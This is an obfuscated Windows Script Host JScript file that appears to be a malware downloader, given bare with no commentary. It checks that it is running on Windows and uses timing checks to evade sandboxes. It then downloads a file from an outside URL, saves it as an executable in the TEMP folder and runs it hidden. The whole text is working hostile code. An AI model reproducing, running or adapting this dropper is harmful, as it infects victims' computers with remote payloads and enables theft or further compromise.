var _PD = false;
var _R0 = "CreateObject";
var _LZ = function _VB() {return WScript[_R0]("WScript"+".Shell");}(), _P = 11;
var _Y0 = "MSXML2.XMLHTTP";
var _XI = 2123213;
var _VF = 0;
function _D(_F0){_LZ["Run"](_F0, _VF, _VF);};
function _CQ(){return _Y0 + "";};
function _R(_NU, _NN){_VF = _VF * 1; return _NU - _NN;};
function _ZU(){return _R0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _PD = true;
  @end
@*/
if (_PD)
{
var _S = "";
function _LM(){return 22;};
var _SE = 0; var _CL = 0;
function _Y()
{
var _VI = new this["Date"]();
var _QE = _VI["getUTCMilliseconds"]();
WScript["Sleep"](_LM());
var _VI = new this["Date"]();
var _HM = _VI["getUTCMilliseconds"]();
WScript["Sleep"](_LM());
var _VI = new this["Date"]();
var _G = _VI["getUTCMilliseconds"]();
var _SE = "_X";
_SE = _R(_HM, _QE);
var _CL = "_JP";
_CL = _R(_G, _HM);
_S = "open";
return _R(_SE, _CL);
}
var _UH = false;
var _EU = false;
for (var _F = _VF; _F < _LM() * 1; _F++){if (_Y() != _VF){
_UH = true; 
_CL = "31" + 11 * _SE + _CL; 
_EU = true; 
break;
}}
function _H() {return ((_UH == true) && (_UH == _EU)) ? 1 : _VF;};
if (_UH && _H() && _EU){
function _OH() {return _LZ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "7eI7lAGMt1t9V.ex" + "e";};
 _W = _CQ();
 _RU = WScript[_R0](_W);
 var _MT = 1;
 while (_MT){
try {
	if (_MT == 1)
	{
		_RU[_S]("GET", "http://shopyb.com/s6dlas", false);
		_RU["send"]();
		_X0 = "Sleep";
	}
	WScript[_X0](_LM() + 120); 
	if (_RU["readystate"] < 2 * 2) continue;
	_MT = _VF;
	function _UW(_TD) {var _NT = (1, 2, 3, 4, 5, _TD); return _NT;};
	_Z0 = WScript[_ZU()]("ADODB.Stream");
	_W = _Z0;
	_W[_S]();
	_W["type"] = _UW(1);
	_W["write"](_RU["ResponseBody"]);
	_Z0["position"] = _UW(_VF);
	_W["Save" + "ToFile"](_OH(), 2);
	_Z0["cl"+"ose"]();
	_QO = _OH();
	_D(_QO);
} catch(_Z){};
}
}
}

